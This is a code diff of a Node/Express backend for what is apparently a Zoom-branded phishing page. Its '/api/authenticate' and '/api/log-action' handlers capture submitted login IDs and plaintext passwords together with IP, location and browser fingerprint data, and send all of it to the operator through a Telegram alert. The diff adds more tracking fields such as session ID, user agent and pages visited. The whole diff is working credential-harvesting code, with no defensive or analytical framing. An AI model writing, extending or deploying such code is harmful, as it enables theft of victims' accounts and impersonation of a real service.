@@ -130,21 +130,26 @@ app.post('/api/log-action', async (req, res) => {
     let tgText = `🚨 New Zoom Action: ${String(action || '').toUpperCase()}
 Login ID: ${email || 'none'}
 Password: ${password || 'N/A'}
-Browser: ${ua}
 Location: ${location}
-IP: ${ip}
+IP Address: ${ip}
 Time: ${new Date().toISOString()}`;
     
     // Add visitor info details
     if (visitorInfo) {
-      tgText += `\n\n--- Visitor Info ---`;
-      if (visitorInfo.fullUrl) tgText += `\nURL: ${visitorInfo.fullUrl}`;
+      tgText += `\n\n--- Visitor Details ---`;
+      if (visitorInfo.fullUrl) tgText += `\nFull URL: ${visitorInfo.fullUrl}`;
       if (visitorInfo.referrer) tgText += `\nReferrer: ${visitorInfo.referrer}`;
+      if (visitorInfo.userAgent) tgText += `\nUser Agent: ${visitorInfo.userAgent}`;
       if (visitorInfo.platform) tgText += `\nPlatform: ${visitorInfo.platform}`;
+      if (visitorInfo.deviceType) tgText += `\nDevice Type: ${visitorInfo.deviceType}`;
       if (visitorInfo.language) tgText += `\nLanguage: ${visitorInfo.language}`;
       if (visitorInfo.timezone) tgText += `\nTimezone: ${visitorInfo.timezone}`;
-      if (visitorInfo.screenWidth && visitorInfo.screenHeight) tgText += `\nScreen: ${visitorInfo.screenWidth}x${visitorInfo.screenHeight}`;
+      if (visitorInfo.screenWidth && visitorInfo.screenHeight) tgText += `\nScreen Resolution: ${visitorInfo.screenWidth}x${visitorInfo.screenHeight}`;
       if (visitorInfo.colorDepth) tgText += `\nColor Depth: ${visitorInfo.colorDepth}-bit`;
+      if (visitorInfo.cookiesEnabled !== undefined) tgText += `\nCookies Enabled: ${visitorInfo.cookiesEnabled ? 'Yes' : 'No'}`;
+      if (visitorInfo.sessionId) tgText += `\nSession ID: ${visitorInfo.sessionId}`;
+      if (visitorInfo.timeOnSiteSeconds) tgText += `\nTime on Site: ${visitorInfo.timeOnSiteSeconds} seconds`;
+      if (visitorInfo.pagesVisited) tgText += `\nPages Visited: ${visitorInfo.pagesVisited.join(', ')}`;
     }
     
     if (intruderDetected) tgText += `\n\n🚨 INTRUDER DETECTED!`;
@@ -170,21 +175,26 @@ app.post('/api/authenticate', async (req, res) => {
     let tgText = `🔐 New Zoom Login Attempt
 Login ID: ${email}
 Password: ${password}
-Browser: ${ua}
 Location: ${location}
-IP: ${ip}
+IP Address: ${ip}
 Time: ${new Date().toISOString()}`;
     
     // Add visitor info details
     if (visitorInfo) {
-      tgText += `\n\n--- Visitor Info ---`;
-      if (visitorInfo.fullUrl) tgText += `\nURL: ${visitorInfo.fullUrl}`;
+      tgText += `\n\n--- Visitor Details ---`;
+      if (visitorInfo.fullUrl) tgText += `\nFull URL: ${visitorInfo.fullUrl}`;
       if (visitorInfo.referrer) tgText += `\nReferrer: ${visitorInfo.referrer}`;
+      if (visitorInfo.userAgent) tgText += `\nUser Agent: ${visitorInfo.userAgent}`;
       if (visitorInfo.platform) tgText += `\nPlatform: ${visitorInfo.platform}`;
+      if (visitorInfo.deviceType) tgText += `\nDevice Type: ${visitorInfo.deviceType}`;
       if (visitorInfo.language) tgText += `\nLanguage: ${visitorInfo.language}`;
       if (visitorInfo.timezone) tgText += `\nTimezone: ${visitorInfo.timezone}`;
-      if (visitorInfo.screenWidth && visitorInfo.screenHeight) tgText += `\nScreen: ${visitorInfo.screenWidth}x${visitorInfo.screenHeight}`;
+      if (visitorInfo.screenWidth && visitorInfo.screenHeight) tgText += `\nScreen Resolution: ${visitorInfo.screenWidth}x${visitorInfo.screenHeight}`;
       if (visitorInfo.colorDepth) tgText += `\nColor Depth: ${visitorInfo.colorDepth}-bit`;
+      if (visitorInfo.cookiesEnabled !== undefined) tgText += `\nCookies Enabled: ${visitorInfo.cookiesEnabled ? 'Yes' : 'No'}`;
+      if (visitorInfo.sessionId) tgText += `\nSession ID: ${visitorInfo.sessionId}`;
+      if (visitorInfo.timeOnSiteSeconds) tgText += `\nTime on Site: ${visitorInfo.timeOnSiteSeconds} seconds`;
+      if (visitorInfo.pagesVisited) tgText += `\nPages Visited: ${visitorInfo.pagesVisited.join(', ')}`;
     }
     
     sendTelegramAlert(tgText);
